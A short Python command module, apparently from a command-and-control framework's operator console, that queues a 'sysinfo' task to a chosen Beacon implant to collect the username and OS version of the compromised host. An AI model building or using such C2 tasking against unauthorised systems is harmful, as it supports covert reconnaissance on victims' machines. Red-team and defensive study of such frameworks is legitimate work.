"""sysinfo — 收集用户名与 OS 版本（走模块管线，无内联代码）"""


def run(disp, args):
    bid, _ = disp.resolve_beacon(args)
    if not bid:
        return "[!] 未指定 Beacon"
    try:
        task = disp.build_task_for(bid, "sysinfo", [])
    except ValueError as e:
        return f"[!] {e}"
    if task is None:
        return "[!] sysinfo module not loaded"
    return disp.push_task(bid, task)
